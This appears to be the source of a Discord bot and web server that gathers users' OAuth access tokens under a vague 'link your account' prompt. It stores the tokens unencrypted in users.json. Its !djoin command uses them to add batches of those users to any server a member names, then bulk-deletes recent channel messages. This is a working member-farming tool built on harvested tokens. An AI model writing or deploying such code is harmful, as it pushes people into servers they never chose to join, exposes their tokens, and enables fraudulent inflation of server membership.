require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers] 
});

const BASE_URL = 'https://my-discord-bot-4h98.onrender.com';
const AUTH_CHANNEL_ID = '1521111193903698053';
const WELCOME_CHANNEL_ID = '1521116293548343427';
const FARM_CHANNEL_ID = '1520843854079852725';
const USERS_FILE = 'users.json';

const getUsers = () => {
    try { return fs.existsSync(USERS_FILE) ? JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')) : []; } 
    catch (e) { return []; }
};

app.get('/login', (req, res) => {
    res.redirect(`https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(BASE_URL + '/callback')}&response_type=code&scope=identify%20guilds.join`);
});

app.get('/callback', async (req, res) => {
    try {
        const { code } = req.query;
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID, client_secret: process.env.CLIENT_SECRET,
            grant_type: 'authorization_code', code: code, redirect_uri: BASE_URL + '/callback'
        }).toString());
        
        const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${tokenRes.data.access_token}` } });
        let users = getUsers();
        
        if (!users.find(u => u.id === userRes.data.id)) {
            users.push({ id: userRes.data.id, accessToken: tokenRes.data.access_token });
            fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
            
            const channel = await client.channels.fetch(WELCOME_CHANNEL_ID).catch(() => null);
            if (channel) {
                const msg = await channel.send(`✨ **Welcome <@${userRes.data.id}>!** You are now authorized. Head over to <#${FARM_CHANNEL_ID}> to start!`);
                setTimeout(() => msg.delete().catch(() => {}), 6000);
            }
        }
        res.send("<h1>Authorization Successful!</h1>");
    } catch (err) { res.status(500).send("Auth Failed."); }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild) return;

    if (message.content === '!authorize') {
        if (message.channel.id !== AUTH_CHANNEL_ID) return;
        const embed = new EmbedBuilder().setTitle('🔒 Authorization Required').setDescription('Click the button below to link your Discord account.');
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Authorize').setURL(`${BASE_URL}/login`).setStyle(ButtonStyle.Link));
        return message.channel.send({ embeds: [embed], components: [row] });
    }

    if (message.content === '!auth') {
        const count = getUsers().length;
        return message.reply(`🚀 **System Status:** ${count} users currently authorized.`);
    }

    if (message.content.startsWith('!djoin')) {
        if (message.channel.id !== FARM_CHANNEL_ID) return;
        
        const users = getUsers();
        if (!users.find(u => u.id === message.author.id)) {
            const err = await message.reply("❌ **Error:** You are not authorized. Use `!authorize` in the correct channel first.");
            setTimeout(() => { err.delete().catch(() => {}); message.delete().catch(() => {}); }, 6000);
            return;
        }

        const roles = { '1520852026823803002': 5, '1520852270898483272': 7, '1520852326800294058': 10, '1520852424108281897': 15, '1520852492768903218': 35 };
        let limit = 2;
        for (const [r, l] of Object.entries(roles)) if (message.member.roles.cache.has(r)) limit = l;

        const sid = message.content.split(' ')[1]?.replace(/[<|>]/g, '');
        if (!sid) {
            const msg = await message.reply("⚠️ **Usage:** `!djoin <server_id>`");
            setTimeout(() => { msg.delete().catch(() => {}); message.delete().catch(() => {}); }, 6000);
            return;
        }
        
        let count = 0;
        for (const u of users.slice(0, limit)) {
            try {
                await axios.put(`https://discord.com/api/v10/guilds/${sid}/members/${u.id}`, { access_token: u.accessToken }, { headers: { 'Authorization': `Bot ${process.env.BOT_TOKEN}` } });
                count++;
            } catch (e) {}
        }
        
        const fetched = await message.channel.messages.fetch({ limit: 50 });
        await message.channel.bulkDelete(fetched, true).catch(() => {});
        const m = await message.channel.send(`✅ **Success:** Added ${count} members to ${sid}.`);
        setTimeout(() => m.delete().catch(() => {}), 6000);
    }
});

client.login(process.env.BOT_TOKEN);
app.listen(process.env.PORT || 3000);
